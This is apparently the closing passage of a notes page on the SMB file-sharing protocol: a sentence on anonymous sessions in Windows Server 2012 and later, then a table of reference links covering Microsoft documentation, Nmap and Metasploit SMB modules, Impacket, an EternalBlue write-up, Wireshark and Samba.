	
	In Windows Server 2012 or a later version, there's a feature to determine whether anonymous sessions should be enabled on file servers. It's determined by checking if any pipes or shares are marked for remote access.

# Resources

|**Website**|**URL**|
|-|-|
|SMB Protocol Overview|https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smb-protocol|
|Nmap SMB Scripts|https://nmap.org/nsedoc/categories/smb.html|
|Metasploit SMB Modules|https://github.com/rapid7/metasploit-framework/wiki/SMB-Modules|
|Impacket Documentation|https://github.com/SecureAuthCorp/impacket|
|EternalBlue Analysis|https://blog.rapid7.com/2017/05/19/eternalblue-exploiting-a-vulnerability-disclosed-by-the-shadow-brokers/|
|Wireshark SMB Dissection|https://wiki.wireshark.org/SMB|
|SMB Best Practices|https://docs.microsoft.com/en-us/windows-server/storage/file-server/best-practices-analyzer/file-services-smb-best-practices-analyzer|
|Samba Documentation|https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html|
|NTLM vs. Kerberos|https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/ntlm-overview|
|Linux CIFS/SMBFS HowTo|https://www.tldp.org/HOWTO/SMB-HOWTO.html|
